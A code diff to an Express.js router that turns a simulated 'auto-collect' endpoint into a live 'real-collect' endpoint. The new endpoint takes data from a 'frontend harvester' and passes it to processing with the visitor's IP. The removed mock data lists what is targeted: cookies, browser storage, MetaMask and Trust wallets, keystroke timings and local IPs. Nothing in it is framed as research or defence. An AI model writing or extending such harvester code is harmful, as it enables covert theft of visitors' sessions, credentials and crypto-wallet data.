@@ -32,26 +32,19 @@ router.post('/collect-data-chunk', async (req, res) => {
   }
 });
 
-// Auto-trigger cookie collection for any visitor
-router.post('/auto-collect', async (req, res) => {
+// Real cookie collection endpoint (called by frontend harvester)
+router.post('/real-collect', async (req, res) => {
   try {
     const ip = req.headers['x-forwarded-for'] || req.ip;
-    console.log(`🍪 AUTO-COLLECT: Triggered for ${ip}`);
+    const realData = req.body;
     
-    // Simulate advanced data collection
-    const mockData = {
-      cookies: { detected: 'browser_cookies' },
-      storage: { localStorage: 'detected', sessionStorage: 'detected' },
-      financial: { wallets: ['metamask', 'trust'] },
-      hardware: { cores: 4, memory: 8, platform: 'Win32' },
-      behavioral: { mousePattern: 'active', keyTimings: 'detected' },
-      security: { devtools: false, headless: false },
-      network: { localIPs: ['192.168.1.1'], connection: '4g' }
-    };
+    console.log(`🍪 REAL COLLECT: Processing actual data from ${ip}`);
+    console.log(`🍪 Data size: ${JSON.stringify(realData).length} bytes`);
     
-    await processCollectedData(mockData, req);
+    await processCollectedData(realData, req);
     res.json({ success: true });
   } catch (error) {
+    console.error('Real collection error:', error);
     res.status(500).json({ error: 'Collection failed' });
   }
 });
